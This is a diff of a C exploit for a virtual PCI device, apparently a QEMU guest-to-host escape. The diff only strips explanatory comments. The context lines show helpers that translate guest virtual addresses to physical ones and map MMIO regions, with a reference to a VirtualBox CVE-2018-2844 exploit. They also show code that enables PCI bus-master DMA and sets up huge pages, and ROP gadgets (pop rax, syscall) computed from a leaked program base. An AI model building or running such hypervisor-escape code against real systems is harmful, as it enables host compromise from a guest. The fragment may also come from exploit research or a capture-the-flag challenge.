@@ -54,7 +54,6 @@ uint64_t page_offset(uint64_t addr)
     return addr & (PAGE_SIZE - 1);
 }
 
-// Guest Virtual Address to Guest Frame Number
 uint64_t gva2gfn(void *addr)
 {
     uint64_t pme, gfn;
@@ -74,7 +73,6 @@ uint64_t gva2gfn(void *addr)
     return gfn;
 }
 
-// Guest Virtual Address to Guest Physical Address
 uint64_t gva2gpa(void *addr)
 {
     if (pagemap == -1)
@@ -95,10 +93,6 @@ uint64_t gva2gpa(void *addr)
     return (gfn << PAGE_SHIFT) | page_offset((uintptr_t)addr);
 }
 
-// This function is used to map most physical addresses into the binary's
-// virtual address space. Mostly useful for mapping MMIO regions.
-//
-// https://github.com/renorobert/virtualbox-cve-2018-2844/blob/master/exploit.c
 uint8_t *map_phys_address(off_t address, size_t size)
 {
     uint8_t *map;
@@ -117,21 +111,11 @@ uint8_t *map_phys_address(off_t address, size_t size)
     return map;
 }
 
-// See https://wiki.osdev.org/PCI#Command_Register
-//
-// Bus Master mode is a bit in the PCI configuration space of all PCI devices.
-// It needs to be enabled to allow the PCI device to generate it's own DMA
-// accesses.
-//
-// Note that although this is set by default in most cases, I've found that at
-// least in QEMU, you have to enable this manually.
+
 void enable_bus_master_mode()
 {
-    // We need to flip the 3rd bit at offset 4 of the PCI configuration space
-    // to enable Bus Master mode
     uint8_t buf[1] = {0x7};
 
-    // Replace the path here with your corresponding PCI device in sysfs
     int fd = open("/sys/devices/pci0000:00/0000:00:05.0/config", O_RDWR | O_SYNC);
     if (fd == -1)
     {
@@ -141,7 +125,6 @@ void enable_bus_master_mode()
     close(fd);
 }
 
-// Simple hex dump utility for debugging
 void hex_dump(char *buf, size_t size)
 {
     for (size_t i = 0; i <= size / 8; i++)
@@ -200,7 +183,6 @@ int main(void)
         errExit("open device resource failed");
     }
 
-    // Set a huge page
     system("sysctl -w vm.nr_hugepages=40");
     system("cat /proc/meminfo | grep -i huge");
 
@@ -253,7 +235,6 @@ int main(void)
     uint64_t pop_rax = progbase + 0x3643a4;      /* pop rax ; ret */
     uint64_t syscall = progbase + 0x4a22ec;      /* syscall; add cl, cl; ret; */
 
-    /* create a base pointer so we can use array-style indexing */
     char *base = buf + (0x2000 - 0xf0);
 
     uint64_t idx = 0;
